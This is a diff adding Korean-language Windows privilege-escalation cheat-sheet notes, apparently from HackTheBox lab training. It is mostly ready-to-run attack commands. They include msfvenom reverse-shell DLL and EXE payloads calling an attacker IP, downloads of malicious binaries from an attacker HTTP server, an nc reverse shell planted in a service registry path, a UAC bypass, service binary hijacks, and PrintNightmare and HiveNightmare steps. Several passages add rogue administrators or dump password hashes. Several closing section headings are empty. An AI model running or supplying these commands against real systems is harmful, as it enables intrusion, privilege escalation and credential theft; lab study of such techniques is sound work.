@@ -605,4 +605,286 @@ static bool LaunchShell()
 ### 도메인 컨트롤러에서 NTLM 암호 해시 검색
 ```secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator```
 
+<br/><br/>
+# 사용자 계정 컨트롤(UAC)
 
+### 현재 사용자 확인
+```whoami /user```
+
+### 관리자 그룹 멤버십 확인
+```net localgroup administrators```
+
+### 사용자 권한 검토
+```whoami /priv```
+
+### UAC가 활성화되어 있는지 확인
+```REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA```
+
+### UAC 레벨 확인
+```REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin```
+
+### 윈도우 버전 확인
+```[environment]::OSVersion.Version```
+- [UACME](https://github.com/hfiref0x/UACME)
+
+### 경로 변수 검토
+```cmd /c echo %PATH%```
+
+### 악성 srrstr.dll DLL 생성
+```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll```
+
+### 공격 호스트에서 Python HTTP 서버 시작
+```sudo python3 -m http.server 8080```
+
+### DLL 대상 다운로드
+```curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"```
+
+### 공격 호스트에서 nc 리스너 시작
+```nc -lvnp 8443```
+
+### 연결 테스트
+```
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll```
+nc -lnvp 8443
+whoami /priv
+```
+
+### 대상 호스트에서 SystemPropertiesAdvanced.exe 실행
+```
+tasklist /svc | findstr "rundll32"
+taskkill /PID 7044 /F
+taskkill /PID 6300 /F
+taskkill /PID 5360 /F
+```
+```C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe```
+
+### 연결 다시 수신
+```
+nc -lvnp 8443
+whoami /priv
+```
+
+<br/><br/>
+# Weak Permissions
+
+## Permissive File System ACLs
+
+### SharpUp 실행
+- [SharpUp](https://github.com/GhostPack/SharpUp/)
+```.\SharpUp.exe audit```
+
+### icacls로 권한 확인
+- [icacls](https://ss64.com/nt/icacls.html)
+```icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"```
+
+### 서비스 바이너리 교체
+```
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+sc start SecurityService
+```
+
+<br/><br/>
+## 약한 서비스 권한
+
+### Reviewing SharpUp Again
+```SharpUp.exe audit```
+
+### AccessChk로 권한 확인
+- [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+```accesschk.exe /accepteula -quvcw WindscribeService```
+
+### 로컬 관리자 그룹 확인
+```net localgroup administrators```
+
+### 서비스 바이너리 경로 변경
+```sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"```
+
+### 서비스 중지
+```sc stop WindscribeService```
+
+### 서비스 시작
+```sc start WindscribeService```
+
+### 로컬 관리자 그룹 추가 확인
+```net localgroup administrators```
+
+> 추가 참고 : [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322)
+
+<br/><br/>
+## Cleanup
+
+### Binary Path 되돌리기
+```sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"```
+
+### 서비스 다시 시작하기
+```sc start WindScribeService```
+
+### 서비스 실행 확인
+```sc query WindScribeService```
+
+<br/><br/>
+## 인용되지 않은 서비스 경로
+
+### 서비스 바이너리 경로
+```C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe```
+
+### 서비스 쿼리
+```sc qc SystemExplorerHelpService```
+
+#### 바이너리 생성 예
+- `C:\Program.exe\`
+- `C:\Program Files (x86)\System.exe`
+
+### 인용되지 않은 서비스 경로 검색
+```wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """```
+
+<br/><br/>
+## 허용 레지스트리 ACL
+
+### 레지스트리에서 약한 서비스 ACL 확인
+```accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services```
+
+### PowerShell을 사용하여 ImagePath 변경
+```Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"```
+
+<br/><br/>
+## 수정 가능한 레지스트리 자동 실행 바이너리
+
+### 시작 프로그램 확인
+```Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl```
+
+- [참고 게시물](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
+- [참고 사이트](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
+
+<br/><br/>
+# 커널 익스플로잇
+
+## 주목할만한 취약점
+
+- CVE-2021-36934 HiveNightmare
+### SAM 파일에 대한 권한 확인
+```icacls c:\Windows\System32\config\SAM```
+
+### 공격 수행 및 비밀번호 해시 구문 분석
+- [PoC](https://github.com/GossiTheDog/HiveNightmare)
+```.\HiveNightmare.exe```<br/>
+```impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local```
+
+- CVE-2021-1675/CVE-2021-34527 PrintNightmare
+### 스풀러 서비스 확인
+```ls \\localhost\pipe\spoolss```
+
+### PrintNightmare PowerShell PoC를 사용하여 로컬 관리자 추가
+```Set-ExecutionPolicy Bypass -Scope Process```
+```
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+
+### Confirming New Admin User
+```net user hacker```
+
+## 누락된 패치 열거
+
+### 설치된 업데이트 검사
+```
+systeminfo
+wmic qfe list brief
+Get-Hotfix
+```
+
+### WMI로 설치된 업데이트 보기
+```wmic qfe list brief```
+
+## CVE-2020-0668 예
+
+### 현재 사용자 권한 확인
+```whoami /priv```
+
+### After Building Solution
+- [익스플로잇](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
+```shell-session
+CVE-2020-0668.exe
+CVE-2020-0668.exe.config
+CVE-2020-0668.pdb
+NtApiDotNet.dll
+NtApiDotNet.xml
+```
+- [UsoDllLoader](https://github.com/itm4n/UsoDllLoader), [DiagHub](https://github.com/xct/diaghub)와 같은 다른 취약점과 연결 필요
+
+### 바이너리에 대한 권한 확인
+```icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"```
+
+### 악성 바이너리 생성
+```msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe```
+
+### 악성 바이너리 호스팅
+```python3 -m http.server 8080```
+
+### 악성 바이너리 다운로드
+```
+wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
+wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
+```
+
+### Exploit 실행
+```C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"```
+
+### 새 파일의 권한 확인
+```icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'```
+
+### 악성 바이너리로 파일 교체
+```copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"```
+
+### 메타스플로잇 리소스 스크립트
+```
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <our_ip>
+set LPORT 8443
+exploit
+```
+
+### 리소스 스크립트로 Metasploit 실행
+```sudo msfconsole -r handler.rc ```
+
+### 서비스 시작
+```net start MozillaMaintenance```
+
+### Meterpreter 세션 수신
+```
+meterpreter > getuid
+meterpreter > sysinfo
+meterpreter > hashdump
+```
+
+<br/><br/>
+# 취약한 서비스
+
+
+
+
+<br/><br/>
+# DLL Injection
+
+
+<br/><br/>
+# Credential Hunting
+
+
+
+
+
+
+
+<br/><br/>
+# 기타 파일
+
+
+
+
+<br/><br/>
+# Citrix Breakout
+
+<br/><br/>
+# 추가 자격 증명 도용
